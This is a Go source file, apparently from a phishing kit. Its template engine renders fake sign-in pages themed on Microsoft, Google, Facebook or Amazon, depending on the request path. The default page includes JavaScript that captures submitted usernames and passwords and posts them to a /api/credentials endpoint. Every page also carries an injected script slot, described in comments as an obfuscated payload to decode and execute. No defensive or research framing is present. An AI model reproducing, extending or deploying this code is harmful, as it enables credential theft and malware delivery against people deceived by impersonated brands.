package templates

import (
	"bytes"
	"html/template"
	"strings"
)

// Engine handles template rendering
type Engine struct {
	templates map[string]*template.Template
	payloadScript string
}

// NewEngine creates a new template engine
func NewEngine() *Engine {
	return &Engine{
		templates: make(map[string]*template.Template),
		payloadScript: generateDefaultPayloadScript(),
	}
}

// RenderPhishingPage renders a phishing page
func (e *Engine) RenderPhishingPage(path, sessionID string) (string, error) {
	// Determine template based on path
	templateName := e.getTemplateName(path)
	
	tmpl, exists := e.templates[templateName]
	if !exists {
		tmpl = e.getDefaultTemplate()
	}

	var buf bytes.Buffer
	data := map[string]interface{}{
		"SessionID": sessionID,
		"Path":      path,
		"Payload":   e.payloadScript,
	}

	if err := tmpl.Execute(&buf, data); err != nil {
		return "", err
	}

	return buf.String(), nil
}

// GeneratePayloadScript generates the payload injection script
func (e *Engine) GeneratePayloadScript() string {
	return e.payloadScript
}

// SetPayloadScript sets a custom payload script
func (e *Engine) SetPayloadScript(script string) {
	e.payloadScript = script
}

// getTemplateName determines template name from path
func (e *Engine) getTemplateName(path string) string {
	path = strings.ToLower(path)
	
	if strings.Contains(path, "microsoft") || strings.Contains(path, "office") {
		return "microsoft"
	}
	if strings.Contains(path, "google") || strings.Contains(path, "gmail") {
		return "google"
	}
	if strings.Contains(path, "facebook") {
		return "facebook"
	}
	if strings.Contains(path, "amazon") {
		return "amazon"
	}
	
	return "default"
}

// getDefaultTemplate returns default phishing template
func (e *Engine) getDefaultTemplate() *template.Template {
	tmpl := `<!DOCTYPE html>
<html>
<head>
	<title>Sign In</title>
	<meta charset="utf-8">
	<style>
		body { font-family: Arial, sans-serif; background: #f5f5f5; }
		.container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
		input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
		button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer; }
		button:hover { background: #0056b3; }
	</style>
</head>
<body>
	<div class="container">
		<h2>Sign In</h2>
		<form id="loginForm" method="POST" action="/auth">
			<input type="text" name="username" placeholder="Username" required>
			<input type="password" name="password" placeholder="Password" required>
			<button type="submit">Sign In</button>
		</form>
	</div>
	<script>
		document.getElementById('loginForm').addEventListener('submit', function(e) {
			e.preventDefault();
			var formData = new FormData(this);
			fetch('/api/credentials', {
				method: 'POST',
				body: formData,
				headers: {'X-Session-ID': '{{.SessionID}}'}
			});
		});
	</script>
	{{.Payload}}
</body>
</html>`
	
	return template.Must(template.New("default").Parse(tmpl))
}

// generateDefaultPayloadScript generates default payload script
func generateDefaultPayloadScript() string {
	// This would contain the actual payload injection code
	// For now, returning a placeholder that would be replaced with actual payload
	return `<script>
		// Payload injection point
		// This will be replaced with actual obfuscated payload
		(function() {
			var payload = 'BASE64_ENCODED_PAYLOAD';
			// Decode and execute payload
			// Implementation depends on payload type
		})();
	</script>`
}

// LoadTemplate loads a template from file
func (e *Engine) LoadTemplate(name, filepath string) error {
	tmpl, err := template.ParseFiles(filepath)
	if err != nil {
		return err
	}
	e.templates[name] = tmpl
	return nil
}

